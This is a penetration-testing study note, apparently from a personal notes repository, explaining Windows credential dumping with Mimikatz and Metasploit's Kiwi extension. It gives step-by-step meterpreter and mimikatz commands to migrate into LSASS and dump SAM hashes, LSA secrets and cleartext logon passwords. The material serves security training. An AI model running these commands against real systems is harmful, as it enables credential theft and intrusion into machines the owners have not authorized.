# Mimikatz
> Mimikatz is pretty much "THE" tool to use in Windows post-exploitation: Password/Hash extraction from memory.

##IMPORTANT:** Mimikatz will required elevated privileges in order to run correctly.
- LSASS is a system process and so runs with system/admin privileges.

## Contents
- []()
- []()
- []()
- []()
- []()
- []()

## Intro

### [Mimikatz & Kiwi](https://github.com/gentilkiwi/mimikatz#mimikatz)
- Mimikatz is a Windows post-exploitation tool written by Benjamin Delpy (@gentilkiwi). It allows for the extraction of clear-text passwords, hashes, and Kerberos tickets from memory.
- The SAM (Security Account Manager) database is a database file on Windows systems that stores hashed user passwords.
- Mimikatz can be used to extract hashes from the lsass.exe process memory where hashes are cached.
  - `LSA` : Local Security Authority
  - `LSASS` : Local Security Authority Subsystem Service
- We can utilize the pre-compiled mimikatz executable.
  - This means you have to upload the executable to the target machine and run it from there.
- Or if we have access to a meterpreter session on a Windows target, we can utilize the built-in meterpreter extenstion called Kiwi.
  - With Kiwi we don't have to upload files to the target machine.
  - We just run it from metasploit (no footprint on the target hdd).
- Resources: [Mimikatz Wiki](https://github.com/gentilkiwi/mimikatz/wiki) | [MetaSploit Docs](https://www.offsec.com/metasploit-unleashed/mimikatz/)

### Why are hashes important?
- You may not be able to crack them and get the plain-text passwords.
- You can use them in [pass-the-hash](/07_Post-Exploitation/6_Dump_n_Crack/win_dump_n_crack.md#pass-the-hash) attacks.

----
## Techniques & Tools

### Scenario & Set-Up
- You compromised a Windows target with MetaSploit and have a meterpreter session.
- Do some basic initial enumeration:
```
> sysinfo
> pgrep lsass
  # Note the pid
> migrate [lsass process number]
  # Since we are going to be interacting with the LSASS process, migrate to that specific process
  # This gives us a 64-bit meterpreter session on the target 64-bit architecture (more stable)
  # This gives us more stability when interacting with the LSASS process to dump hashes.
> getuid
  # if we have access as Administrator, no privesc needed
> getprivs
  # confirm we have admin privs
```

### Meterpreter Built-In Extension: Kiwi
> Assuming the same scenario: you have compromised a Windows target with MetaSploit and currently have access via a meterpreter session. Because we are dinkin' around with the LSA, we should migrate our meterpreter session to lsass.exe. That will be more stable.
- Kiwi allows us to dynamically execute Mimikatz on the target system without touching the disk (uploading mimiktaz.exe to the target will save it to the hard drive).
```
> load kiwi
> help              # at the bottom of the help file you will get the kiwi module help
> creds_all         # retrieve all credentials
> lsa_dump_sam      # dump the sam database contents
> lsa_dump_secrets  # dump the lsa secrets (unparsed)
```
- This will give you basically the same results as `hashdump` above (copy into a text file: hashes.txt).
- `load kiwi` : Should get visible feedback of successful load
- `creds_all` : will try to get everything; might give you the NTLM has of the administrator account
- `lsa_dump_sam` : This dumps the cached contents of the SAM db
  - REMEMBER: The SAM db is encrypted with a "syskey" and mimikatz/kiwi just gave you that key with this dump.
- `lsa_dump_secrets` : In SOME cases this MIGHT provide you with clear text credentials.
- If you are working within an AD (Active Directory) environment, you can run the kerberos dumps and/or create a golden ticket.
- Handy Kiwil command: `password_change`
  - This is NOT something you'd want to do in an enterprise environment pentest (b/c you'll change an actual account password and/or hash).

### Mimikatz on the Target
> Same scenario... If you wanted, you could upload the mimikatz Windows executable to the target (onto the target's hard drive).

#### Upload mimikatz.exe
- With your meterpreter session, navigate to the root of the target, create a Temp subdir for your files.
```
> upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
  # Kali comes with various Windows executables, and mimikatz.exe is one of them.
> shell
  # gets you a cmd on the target
```

#### Run mimikatz.exe on the Target
- In the cmd shell on the target...
```
dir    # should see mimikatz.exe in your Temp dir
mimikatz.exe              # start it up... you get the mikikatz environment and prompt
privilege::debug          # check your privs
                          # if you get "Privilege | 20 | OK" you have sufficient privs to execute
lsadump::sam              # should give you the cache dump: syskey, samkey, hashes
lsadump::secrets          # same results as with kiwi in msf
sekurlsa::logonpasswords  # IF there are clear-text pwds, you'll see them; else Password: (null).
```
- `sekurlsa::logonpasswords` : Some Windows systems are configured to store users' logon passwords in clear text. Mimikatz can find these.




